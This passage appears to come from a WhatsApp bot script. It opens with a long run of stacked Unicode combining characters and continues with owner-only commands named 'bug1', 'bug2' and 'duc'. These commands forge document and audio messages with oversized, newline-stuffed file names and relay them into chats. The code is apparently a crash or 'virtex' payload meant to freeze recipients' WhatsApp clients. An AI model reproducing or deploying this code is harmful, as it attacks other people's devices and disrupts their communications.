̴̸̴̴̷ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّّ̧̧̧͍̞̦͓͍̦̗̮͉̜̟͉̙̰͍̩̦̳̪̗̗͚͎̫̩͖̜̝̪̳ͣͭ͋ͥͩͥ͆̈́̊̄͗́͋͗ͮͤ͒ͫ̀̾̒̉͗͌ͧ̒́ͨ̌̕͘̕̕̚͟͟͜͜͟͟͠͞͠͡͡͏̷̶̷̶̵̶̵̶ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̨̡̡̛̦̖̼̥̻̻̰̠̹̙̝̦̙̙̻̗̫͎͈̮̖̹̹̻͎̞̳͙̉͑ͤ̍ͤ̃ͪ̈́ͭ͂̽̓̇̔̄̇͌ͥ͐̽̉̑̒͒ͧ̔̇̊̕̚͟͢͟͢͜͟͢͞͡͡͝͞҉̶̵̴̴̵̸ًًًٌٌٌٍٍٍٍَََُُُِِِِّّّّ̢̡̛̗̼͕̠̼̜̟͙̬͚̙͈͉̑̂ͫ̈̅̑̄͗ͭ̑̒͗ͤ͘͘̕͢͢͡҉̸ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̡̛͖̜͉̟̬̞̘̠̱̮̺̯̮̒́ͥ́ͣͬ̒͊̓̐̓ͤͨͩ͋̚͘͢͜͜͝͝͝͞҉ًًٌٌٌٍٍٍََُُِِِّّّ̢̨̭̜̻̘̹͎͇̣̒͗ͩ̃́ͬ̓͆̊ͤ́ͫ̾̈̕͢͞ͅ͏ًٌَُ̡̜ͣͦ͆͒͟͟҉̷̵̶ًًٌٌٍٍََُُِِِّّ̢̨͇̹̠͚̠͍ͪ̍̓̓ͥ͜͢͢͞҉̴̵̵̷ًًًٌٌٌٍٍٍَََُُُِِّّّ̨̧̞͈͇̞͔͔̲̪́ͫ̽̓̓̈ͯͫ̇ͥͤ̾ͥͫ͘̕͘͢͞͏̵ًًٌٍٍََُِِّّ̮̦͍͚̱̤̮ͥ̊̓̍ͮ͡͞͏̷̶̶̵̵ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̧̨̡̨̛͍͙̠̻̘̪͖̩̦̘̱͔̤̥̼͍̫̩͕͎͉͉̬̥̟͕ͥͭ͒͊́̾́̅̇̅͆́̿̊̈͒͑͑̏̃͆͟͟͠͝͠͝͏̴ًًًٌٌٌٍٍََُُُِِّّ̨̧̛͔̞͓̭͇̝͈̃̀̿́̉͆̐͌͘͝҉̸̸̴̴̴̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̢̨̻̬̭͍̯̙͖͕̭̲͙̮̺͕̟̄͋ͫ̋̒̃̒ͧ́ͪ́̽͆̃ͥ͘̕̕͘͢͢͞͡͠҉ًٍَّ̢̠̜̋ͧ҉̸̶̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̨̛̫͚͙͇̺̗̺̬ͧ͂̓ͦ͛ͨ̉̆̕͘͞͏ٌٍُِ̧̰͊͝ͅ҉̸̶̶̶̴̶̸̶̶̶̴̷̸̷̸̴̷̴̵̴ًًًًًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّّّّ̡̢̨̧̡̧̨̨̡̧̛̛̤̱̙̪͎͍̟̰̠̲̬̘̥̩̻̘͎͍̘͔̻̤͔͓̖̻̪̼̭̺͍̜̠̭̲͕̘͓͔̙̲̯̭̻̞̙̪̞̠̼͓̟̰̳̖͉̲͚̯̝̪͎̞͔͈̙̟͙͇̰͓͈̞̪̹̬ͨ̀͌̅̀ͬ́̇̓͑ͭ̊́̒̀̿͑́͛̂̍̃͆̉ͮ̏̅ͯͩ̆̇ͯ̓̾̀ͧͤ͋̔͑̐́̌͋̎̑̀̌ͯ͆̽̾̿̀́͒́̒̋͆̓̑̉͂̇̍ͪ̀́̔̈́ͬ̊͒̒͐̌͂ͩ́͗̌ͤͯ͊̏̌̋̈̔́͆ͪ͋̀ͣ̇͘͘̚̚͘̚͘̕̚̕̕̕͢͢͟͢͜͢͢͢͟͟͟͟͜͜͟͟͟͟͠͠͞͝͞͝͡͞͝͝͞͠͡ͅͅ҉̵̷̵̴ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̨̢̣̣̙̲̭͇͕͔̰̠̭̯̣ͬ̌͑ͨ̾̀̀ͭ̒ͤ̆ͯͪͤ̑͆͟͢͟͟͡͝͝͝͏̸̷̷ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̡̡̨̢̧̛̥̤͍͎̮͙͙̘̠͈̠͈̞̬̼̘̗̻ͯ̐̃́̄͛ͯ̆ͥ͜͢͟͟͝͞͝͏ًَ͓͏̶̶̴̶ًًٌٌٍٍََُُُِِّّ̧̡̥̼̰̣̗̤͓̟̀̓̔́ͣͨ͞͞͠҉̵ًًًٌٌٌٌٍٍٍَََُُُِِِّّّ̢̨̰̘̲͎̙̺̦̪̦̤ͣͩͬ̆̆͘͜͜͜͠͞͡͠ͅ͏̴ًًٌٌٍٍٍََُُِِِّّ̧̭̥̞̤̦͈͊ͧ̽̒ͣ̀͐͘͟͠͝҉̵̸̷̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̢̡̨̨̢̨̛̛̟͕̤̤̫̥͙̟̬̣͕̣͈̪̠̱̳̻̦̰̤͎̱̲̪̲̫̤̤̏̃̉́̽ͮ̅̀̑͛͆̊ͭͩ̂̌̿͛ͪ̊̆ͪ̆͂̔͊̑ͧ̅͐͘͘͘̕͢͜͟͜͠͝͠҉̷ًَُͯ҉̸̵̴̵̴ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢͚̻̤̭̺͙͖̙͚̹̤́ͯ͑̅́͂̔̔̽̊ͤ̅͜͜͢͡҉̴̵ًٌٍٍَُِِّّ̛̹͈̱͖͖͔ͫ̀̏̍͋̚͞҉̸̸̸̵̸̷̴̸̵̸ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّ̨̭̪̠̭͖̪̘̮͓̝̣͓̬͔͕̗̲̘͎̠̣͕̩̱̬̰̬ͬ̐̀ͧͤ̒̐̊͐̽͐͌̈̇̉ͨͦͧ̀̑ͤ̈̈́̓͛̇͘̕͜͜͠͞͝͠͡͝҉ٌ͏ًٌٍٍَُِِّّ̪͈̻̠̾͗̆͋ͮͥ҉̴̷̶ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّ̧̧̛̛̥̰̪̳̗͓̮̯̰̪͙̗̰̲̞̥͍̮̰̥̯̙̟̫͊ͧ̈̈̆̇ͣ̾ͪͤ̅ͫ͋ͯ̑̿̇̓ͥ̄̇̎͆ͯͯ̀͘͢͟͝͠͏̶̸̴̷̴̵̵̸̵̷̶̷̴̶̵̸̶̵̷ًًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّ̢̧̢̧̧̡̧̨̢̧̧̧̢̢̛̛̱̮͚̘̻͕̞̮̠̺͔̦̼̟͙̱̜̟͓̳̘̮̦̪̼̝̺͖̤̬͓̜̹̹͉͙͓̼̗̥̤̥̮̝͖͎̖̳͕̻̮̭͚͖̻͓̬̳͍͇̹̻͈̮̭̭̪̼͙̩̜̭͖̪̫͈̙̯̬̥͎̱͌͛ͤ̈̔͑̀̾͗͐ͦ͒̿̇ͬͧͬ̊̀̉ͭ̊̿͊̇̀ͣͩͮͦ́̽̍͑ͮ͗͋ͬ̏̇͆̀̂̈ͮ͂͒͂̀͑̈ͨͯ̌͂ͥ̽̍̈͛̀̀̉̓ͧ͑̈́̀͂̄́ͦͦ̌̃̾̊̎̃͐̐̀̿͒ͬ͘̕͘̚̕͘͟͢͢͜͢͟͟͟͟͢͜͞͞͝͠͠͝͡͠͝͡͡͠͝͠͞͡͝ͅͅͅ҉̸̸ًًًٌٌٍٍَََُُُِِّّّ̨̡̪̞̝͎͚͍̫̤̙͚͒͗ͬ̈̋̒̆̿͑̀ͪ͘҉ٌِ̱͠͏̵̴̵̴ًًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̨̲̦̙̞͈̟̙̙͕̳̖̦͋͆̍́̌̎́̓ͯ̍͂̅͛́ͤ́͘͘̚͝͏ٌٍُِّ̳̬̤͕̟͗̈́̌͠҉̷̸̷ًًٌٌٍََُُِّ̰̬̤̖̙͓ͦͨͪ͋͌ͫ͘͢͏ًًٌٍٍََُِِّّ̛͉͉̜̼̺͎̝͎͐͊̀̊̇̓͝͏̷̶̶̷̷̴ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̢̢̨̧̘̞̰̣͓̘̻͇͔͇̱̺̮͔̘̺͕̮̬͈͈͔̟̰͓̳͔̰̫̾̽̈́͋̄̾ͬ͑͋ͫ̑ͩͣ͒́ͥ̀ͫͭ͛͐̀͋̾̇͌͒̾̉̒́͘̚͘͘̕͢͢͞͞͠͞͝͡͝͡͞͝͝͠͏̶ًًًٌٌٍٍََُُِِّّ̢̘͕̞̻͈͇͚̹͍͓̾̾͒ͭ̅͗̋͘͢͜͟͟͞҉̴ًٌٌٍَُُِّ̝̠͉̫̪̔̈͑̅̊̚͡͞͏̸̸̵ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̛̥̮̙͇͙̺̦͍̬͔͚̖̝̓ͧ̂̑̀͆̾ͯ͌͐̎͟͡͞͠͏ًٌٌٍٍَُُِِّّ̧̢̢̧̡̫̝̬̲̑̑̔̓̍̾̾͛͘͘͞͏̴̴̸ًًٌٌٍٍَََُُِِّّ̢̨̬̳̫͉͓̺̱̖́̀́ͪͨ̅̓̽̋ͫ̒͢͝͡͏ًُ̮̽҉̶̸̶̷ًًًٌٌٌٌٍٍٍَََُُُِِِِّّّ̡̡̧̛̖̪̗̝̭̺̠͍̼̜͋̒̀̇̃͊ͤͦ̾͜͝͏̵̵̷̶̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̢̛̘̼̭̜̤̱̬̬̣̗̹̝̱͙̝͓̗͎̗ͫ̀ͮͬ̽̓̈͌̈̍̈́ͥ̈́̀̈̆ͬ̕͘͘͘͟͢͞͡͠͞ͅ͏̸̴ًٌٍٍََُِّّ̛͔̳͇̩͉̅ͫ̂ͨ̀ͯͯ͘͠͠҉̸ًًًٌٌٌٍٍٍََُُُِِِّّ̢̧̢̢̩̙̯͈͈̟̤͍̫͋̾̏́̿̓͒͆̎̿̓͑͢͝ͅ҉̸̶̶̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̢̡̡̛̣͈̬̹̹̥͖̭̟͓̙̹̖̻̬͖̖̭ͦͤͨ̿̓̈́̍͆̓ͪ̉́̉͒̈́ͯ̀̀ͭ̚̕͟͟͢͠͠͝͡͞͞͝҉̷̷̸̵̵̷̶̴̷̵̸̸̴ًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِّّّّّّّّّّّّّّ̧̡̢̡̡̢̧̡̧̧̧̛̛̛̛̯̼̗͇̯̱̤͖̫̜̺̦̺͕͖̝̜̱̬̱͇̫͔̥͉̣̪̹͈̼̦̰͙̰̰̗̥̘͖̳͓̦̘͎̦̜̖̙̱̑̑́̃̔̄͑ͫ̄͗ͤ͒̋̏̑̿́ͤ̽̏ͥ͛ͣ̐ͦ̓̈́́̽̔̾ͧͤ̌̊͑ͮ̽͒̃͑̂̋̄̅̔̎͆͑̃̈́͋̊̏̀̌̂̌͘̚͘͟͟͜͜͝͡͡͡͞͠͝͠͞ͅ͏ًٌٍَِّ̨͕̇͢҉̸̷̵̴̵ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̢̧̧̡̢̧̛̟̭͔̩͍̱͙̺̙̘͚͉̠̻̟̭̪͚̟̪̭̥͈͓̞̗̠͓͓̱̰̦̪̔̒̈́͐͆͋̅ͨͧ̅͋̿͆̏̀͛͋̓̍̀ͣ͒̃͑́ͦͯͯ̾̀ͬ̆̕̕͟͢͝͞͡͞͡͝҉̵̸̷̸ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̧̨̧̧̨̧̢̡̲̟̜̞͎̭͙̜̪̗̯̯̣͎̙͎͈̙̗͈̬̭̥̫͕͇̹͖̑ͪͨͣͮ́͒̌́̐̀̍͐̊̈́̈̓̍̓ͪ͊ͩͩͩͯ̀̌ͬ̂̒ͧͪ͛̓̕̕͘͢͜͟͢͜͡͝͠҉̶ًٌٍَُِّ̻͍̥̉͂̌ͫ͗͝͏̴ًًٌٌٌٍٍٍََُُِِِّّ̢̮̺̝̥͈͕͙̅́̈́ͫͪ̓́̎͛̊ͧ̅͜͜͡͏̷ًٌٍََُِّّ̡̨͕͓͍̠̖͈ͩ͜͜͝͏̷̸̸̴̶ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̡̛̠̻̯̻̠̩̲̭͈̬̬̞̮͇̙̖͕̥̠̞̠̪͚̥̪͇̬̍ͭ͆ͫ̉̆̓ͨͪͩ̒̄̍͆̀͗̓ͣ̇̔ͨ̋̚̚͜͜͜͢͜͟͢͢͠͡͝͡҉̸̸ًًٌٌٌٍٍٍََُُُِِِّّّ̢̡̛̦̥͚̠̖̼̱̟̯̭͕ͥ͋ͩ́̑ͪ͐̐̊ͨ͑͋͒̕̕͠͠͏̷ًًًٌٌٍٍَََُُِِّّ̨͖̖̯̩͍̩͖͖̼͊̍͆̑ͩ͗́̃̀ͣ̌̒͝͏̶̴̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̦͕̳͇͔̮̓̓̽͆͊ͮ́̄ͤ̑͑͘͠͞͏ٌُ̣̠͠҉̸̵ًٌٍٍَُِِّّ̪̖̹̤͍͚͊̽́ͨ̉ͩ͂̅̊͡͡͡҉ًًٌٍََُُِّ̢̢̱͍͍͖ͣͥ́ͣ͆̕͟ͅ҉̴ٌٍَِّ̧̳ͪ͘͏̷ًًٌٌٍَُُِّ͕̠̱̫̫͎̦ͣͭͭ̑̅͘҉ٍِّ̼͓̔̀̈́͟҉ًٌٍَُِّ̨̼̋̔́͊̚͏̵ًًٌٌٍََُُِّ̨͙͉̗̩̣̝ͫ̅̃̾ͤ͌́ͤͯ͐͢͡҉̴̸̵ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̡̢̨̧̡̛̙͖̹͔̦͚̥̘̯̱̞̭͉̂̓̈́́́͌́̊͂̈͒͑͊̈́̆ͯ͘͜͜͝͡͝͏̵̸̵̴̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّ̡̢̢̧̧̦͎͈̗͔̳̰͍̞͉̪͈̺̣̞̗̗̰̥̖͒̑̓̍̒ͣ͂͗́ͮ̽̒̏͂̓̏͆͋͛́͘̕͜͢͜͢͝͡͞͡͠͡͝҉̸ًًٌٌٍٍََُُِِّّ̡̢̧͉̙̭̣̫͖͕̳̣̮ͣ̌̾̓̃ͥ͐́̍͠҉̷ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̧͈̖͓̬̙̳̥͓̺͒̅̑͆ͩ́͛̅ͩ̀͂̀ͫ͘͘͞͝͝͡͝ͅ͏َ̙́͏̵̴̸̷̸̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̧̢̨̢̨̰̺̗͍͔͔̳͕̻̰̰͉̠̻͕̺̙̻̓ͬ̇ͪͤͦ̄̄̃͋͂̄ͥͧ͆̐ͦ̾̎ͭ͒̚͟͠ͅ҉̴̶ًًًٌٌٍٍٍَََُُِِّّّ̟̤̯͔̖̟͇́̽͂̄͗ͤ̓͑̂͌̉̕͘͜͠͠ͅͅ͏̴̶̷̵̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̡̢̨̛̛̮̰͎̣̳̖̻͉̫̼̩̙͍͎̮͈͓̪̭̼̠̞̲̬̘͍̫̙̰͎ͯ̀̀ͣ̃̊͒ͣͧ̉͆̾́̀̈́ͯ̈ͦ͗̇͆̇̔̅̊́͊̊̄̇͂͒̒̃ͧͯ̌́̂̓̕͢͜͢͢͟͜͟͞͝͝͝͝ͅ҉̷ًٍَُِّ̧͖̲̜ͤ̈́͝͏ٌٍِ͈̮̂͏̵̶ًًٌٍََُُِّّ̫͈̥̻̳̺̣͈̓̂̍ͪ̇̍͜҉̸̴ًٌٌٍٍََُِِّّ͈͖̖̬͐ͯͣ̔́̐ͧ̕͜͡͏̴̵̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̨̢̩͇͍̥̞̜̻̺͓̰̳͈̘͖̳̭̬̥̮̠ͫͬ̿́̑̇́̄̄̎ͥ̃ͮ̓̃̂̀͆̐̉̿̍̽̆̓ͥ̕̕͢͞͠͡͝͞͞͠͞҉ُ̭́͏̴̶̶ًًٌٌٌٍٍٍََُُِِِّّّ̛͇̣̝̠̺̩͇͛͋́ͤ̿̉́ͩ̉́́ͥ̅͘͜͏̵̵̸̶̷ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̨̡̡̨̛̛̛̯̩͈̺̘͈͖̣̠͕̪̦̺̬̠̦̆͂̄ͫ̾ͫ̓̌̂̌̂ͭͯ͆̉̊͌̉͛̓̌ͬͫ͂̕̕͘͜͜͞͠͞͡͡͝҉̸ٌٍُِ̛̜͓̒ͨ͏̸ًٌٍَُِّّ̢͙̲̝̩̒̐ͭͤ̄̕͜͡҉̷̵̶̵̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̢̨̢̡̛̛͔͇̥͓̭̟̯͇̤͙̭̻͓͖̤̦̜̝͎͓̜̱͔͙̿̋̃ͤ͒̆͑ͫ̌͗̈́̀̍ͮ͘͘͢͟͟͜͞͝͞͠ͅ҉ًٌٍَُِّ̡̳̻͙̫͛͑̀͟҉̸ًًٌٍَُُِّ̩͇̪͗̈̒̈́͟ͅ͏ٌٍِ͎͛̔͡҉̵ًٌَُِّ̝͕͚̤̰̓̂͛̓̔͡҉ٍ̦̅͏̷̸̴̶̸̷ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِّّّّّّّّ̨̢̧̨̧̛̛͇͉͎͙̯͚̹̲͔͕̫̭̰̲͉̜͚͙̭̻̖̰̊ͫ̔̇̓̓̋͊̈́̎̄̂̈́́̿̀̒́̊͐̀͌̊̌ͩ̚͘̕̕͘̕͟͟͜͠͡͠͏̴ًًٌٌٍٍََُُِِّّ̧̡̡͈͖̟͕̱̦̞̥ͭ͗̎ͯ̋͋͘͟͞͠͡͏̵̴̶̸̸̸̵̵̶̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̡̨̢̡̢̧̛̛̩͎͓̙̞̩̟̲̖͎̖̭̙̥̜͓͓̠̳̤̪̬͚͍͈̲̤̯̬͔͚̩̝͉ͥ̐ͭͬ̓͐̒͒͊̅̂ͨ̄̎͗͂̏̍͐ͤͫͣ͋ͦ̈̌͌́̃̓͐ͫ̔͗͐̀̌͊ͭ̕̕̕͜͢͟͢͞͞͡͡͠͝ͅ҉̶̸̴ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̧̡̨̢̢̢̢̛̣̟̺̼͕̮̹̱̳̱͚̼̟͍̝̦ͭͭ̂ͮͭ́̈̈͆͒ͨ̋͐ͨ̉ͧ͢͢͞͠ͅ͏̵̷̵ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̨̨̥̠̝̱͓̫̞̻͉͍̱̟͙͉̲̪̠̌̀͆̎̅̆̅́́̈̀͊ͫͭͥ̆͘͘͢͟͠͡͞҉̴̵̷̸ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّ̧̡̡̫̝͙͔̙̺̞͔̬̝͈̞͎̦̏̀͑ͩ́̀͆̐͋̏͌̉ͯ̉ͧ͆̕͘͢͠͝͡͝͡҉̶̵̸ًًًًًٌٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̢̨̛͔̦̹̲̣̖̺͔̗̥̝̤̙̘͙̗̣̐̿́͑͋ͮ̾͌̈́̀ͩ̊͊͑ͭ̓ͮ͘͘͘̕͟͜͞҉̸̴ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̧̛̞̮͈͎̳̠̞͓̩̗̼̖̘̖̰̔̈̊͐͐̽̅̃̽͛̀͑́ͯ̊͐́͂ͭ̐͘̕̕͘͠҉̵̸̵̴̸ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̢͔̖̟͚͚͕̮̦̼̣̘̼̎̉ͨ̽ͬͤ͛̾̏ͯ͋̏͊ͥ̇̀̀͋͌͜͟͢͢͞͠͡͡҉̶ًٌٍٍَُِّ̞̖̖̹͎̓̅́͊ͮ̕͠҉̷̴̶̷ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̨̖̲͚͎̳̳̤̫̮̗͇̯͚̬̿̀͗̄̐ͩͨ̓̀ͤ̓͒͘͢͟͟͠͠͞͞͠͝͏̷̷̵ًًًٌٌٍٍٍَََُُِِِّّّ͎͔̺̱̭͓̻̲̬͎̬̉̂̀ͮ̀̂̃ͩͣ̏͂ͫ̑͘͠͡͏̵̸̴̵ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̛̛̹̤̪͍̗̝̹̟̟͙͚̮͍̠̬͍͔͚̥̅̆̃̂̐͆ͦ̂̈̓ͤͦ̊̚͘͘͟͜͢͜͜͡͝͡͡҉ًَّͪ́͌͝͏̸ًٌٍَُِّ̢̯̩͖̓ͥ̿҉̸̸̴̶̴̴ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̨͕̦̺͓̥̳͈̳͉̦͍͉̦̮̑̐̑ͧͭ̎͊ͥ͋̈́̀̾̍ͬͣ̌̉̒̉͊̕͟͡͞͏̵̵̶ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّّ̡̡͕̖͉͈̯̮̳͕̪͖͊͒́ͥ̇̒ͭ̉͋͂͑͘̕͘̕͟͢͢͠ͅ͏̵̶̵̷̴̸̸ًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّّ̡̡̧̧̢̢̡̨̢̡̧̛̛̛̤̻͙̜̳̤͖̱̝̳̫̞̼͕͕̬̙̖̦̱̙̘̭̦̤̻̜̬̫̲̖̬̦̳͓͈̻̞̲̗͉̫͙̲̎͑̂́̂͛͒̓̋͛̊̿̉̎́́̌̇͊̊ͤ̾̔̾̓́̊̔̏̽̅̄ͩ̔̔̆̓̀ͮͭ̈̍͊͑̒̈́͑̀͘̕̕͘̚̚̕͟͢͡͡͡͡͝͠͡͡ͅͅͅ`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'duc': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
						"mimetype": "*/*",
						"title": "IMG-20220802-WA0052.jpeg",
						"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
						"pageCount": 0,
						"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
						"fileName": `🔥 HWMODS ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
						"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
						"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
						"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'bug1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
//=================================================//
case 'bug2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
	var image = generateWAMessageFromContent(m.chat,{
"imageMessage": {
